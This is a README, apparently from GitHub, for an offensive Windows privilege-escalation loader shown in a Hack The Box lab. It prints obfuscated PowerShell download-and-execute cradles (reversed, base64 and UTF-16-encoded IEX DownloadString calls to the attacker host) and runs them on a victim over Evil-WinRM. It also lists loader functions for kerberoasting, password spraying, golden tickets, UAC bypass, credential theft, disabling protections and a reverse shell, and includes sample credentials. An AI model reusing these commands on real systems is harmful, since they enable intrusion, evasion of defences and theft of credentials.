# pew
This is a loader for privilege escalation workflows with windows.

# Installation
```bash
python3 setup.py
```

# Usage
```bash
pew # if you have access to port 80
pew $local_ip $port
# edit the powershell loader
ee
```

# Example
from attack srv host
```bash
┌─[us-dedicated-217-dhcp]─[10.10.14.3]─[dockrmanhattn@htb-iajitg1lhm]─[~]
└──╼ [★]$ pew 10.10.14.3 9002
certutil -encode .\es.exe enc.txt
IEX: IEX (New-Object Net.WebClient).DownloadString("http://10.10.14.3:9002/enum.txt")
Reversed: ')"txt.se/2009:3.41.01.01//:ptth"(gnirtSdaolnwoD.)tneilCbeW.teN tcejbO-weN( XEI' | ForEach-Object {$reversed = $_.ToCharArray();[array]::Reverse($reversed);-join $reversed} | IEX
UTF8: IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JykidHh0LnNlLzIwMDk6My40MS4wMS4wMS8vOnB0dGgiKGduaXJ0U2Rhb2xud29ELil0bmVpbENiZVcudGVOIHRjZWpiTy13ZU4oIFhFSScgfCBGb3JFYWNoLU9iamVjdCB7JHJldmVyc2VkID0gJF8uVG9DaGFyQXJyYXkoKTtbYXJyYXldOjpSZXZlcnNlKCRyZXZlcnNlZCk7LWpvaW4gJHJldmVyc2VkfSB8IElFWA==")))
UTF16: powershell -enc JwApACIAdAB4AHQALgBzAGUALwAyADAAMAA5ADoAMwAuADQAMQAuADAAMQAuADAAMQAvAC8AOgBwAHQAdABoACIAKABnAG4AaQByAHQAUwBkAGEAbwBsAG4AdwBvAEQALgApAHQAbgBlAGkAbABDAGIAZQBXAC4AdABlAE4AIAB0AGMAZQBqAGIATwAtAHcAZQBOACgAIABYAEUASQAnACAAfAAgAEYAbwByAEUAYQBjAGgALQBPAGIAagBlAGMAdAAgAHsAJAByAGUAdgBlAHIAcwBlAGQAIAA9ACAAJABfAC4AVABvAEMAaABhAHIAQQByAHIAYQB5ACgAKQA7AFsAYQByAHIAYQB5AF0AOgA6AFIAZQB2AGUAcgBzAGUAKAAkAHIAZQB2AGUAcgBzAGUAZAApADsALQBqAG8AaQBuACAAJAByAGUAdgBlAHIAcwBlAGQAfQAgAHwAIABJAEUAWAA=
Serving HTTP on 0.0.0.0 port 9002 (http://0.0.0.0:9002/) ...
es.exe built successfully. Edit the es.txt or enum.txt file.
```

```
┌─[us-dedicated-217-dhcp]─[10.10.14.3]─[dockrmanhattn@htb-iajitg1lhm]─[~]
└──╼ [★]$ ee

<SNIP>
function enum_allthethings{
    bloodhound
    enum_local
    enum_computers
    enum_sqlservers
    enum_webservers
    enum_domadmins
    enum_users
    enum_groups
    enum_groups_resolvenested
    enum_enumeration_in_the_forest
    enum_going_beyond_the_forest_trust
    enum_getspns
    enum_laps
    hostrecon
    kerberoast
    asreproast
    enum_adpeas
    enum_ADRecon
    sharppack
    enum_powerview
    enum_adenum
    enum_directory_structure
    enum_dangerous_rights_all_users
    zip_files -path $p
}

#pullfiles
#enum_allthethings
#enum_local
#enum_computers
#enum_domadmins
#enum_specificgroup
#enum_groups
#enum_getspns
#enum_groups_toplevel
#enum_groups_resolvenested
#enum_enumeration_in_the_forest
#enum_going_beyond_the_forest_trust
#enum_users
#enum_specificuser
#enum_adpeas
#enum_adenum
#enum_ADRecon
#printnightmare
#hostrecon
#kerberoast
#asreproast
#password_spray
#enum_webservers
#enum_sqlservers
#enum_inveigh
#find_PSRemotingLocalAdmin
#find_WMILocalAdmin
#bloodhound
#bloodhound -domain domain.com
#enum_laps
#shell_powercat
#group3r
#sharppack
#enum_powerview
#enum_uac_fodhelper
#enum_uac_fodrunner
#zip_files -path -$p
#cats_inmem
#golden_ticket
#golden_ticket_trust_key
#enumerate_sql -u webapp11 -p 89543dfGDFGH4d
#enumerate_sql
#rdp_thief
#enum_directory_structure
#enum_specific_domain comply.com

### remember that this needs to be run in the context of the domain authed user, so be sure to include the domain in the xfreerdpsession
#enum_dangerous_rights -userAccount "prod\offsec" #may not work with something like prod.corp1.com
#enum_dangerous_rights_all_users

enum_allthethings
#disable_protections  #usr: manhattn:Password1!
#cats
#privesc
```
from victim windows host
```powershell
*Evil-WinRM* PS C:\windows\tasks> powershell -enc JwApACIAdAB4AHQALgBzAGUALwAyADAAMAA5ADoAMwAuADQAMQAuADAAMQAuADAAMQAvAC8AOgBwAHQAdABoACIAKABnAG4AaQByAHQAUwBkAGEAbwBsAG4AdwBvAEQALgApAHQAbgBlAGkAbABDAGIAZQBXAC4AdABlAE4AIAB0AGMAZQBqAGIATwAtAHcAZQBOACgAIABYAEUASQAnACAAfAAgAEYAbwByAEUAYQBjAGgALQBPAGIAagBlAGMAdAAgAHsAJAByAGUAdgBlAHIAcwBlAGQAIAA9ACAAJABfAC4AVABvAEMAaABhAHIAQQByAHIAYQB5ACgAKQA7AFsAYQByAHIAYQB5AF0AOgA6AFIAZQB2AGUAcgBzAGUAKAAkAHIAZQB2AGUAcgBzAGUAZAApADsALQBqAG8AaQBuACAAJAByAGUAdgBlAHIAcwBlAGQAfQAgAHwAIABJAEUAWAA=
```
![image](https://github.com/user-attachments/assets/ecbb6f48-c231-4330-9887-4db4b3da8306)



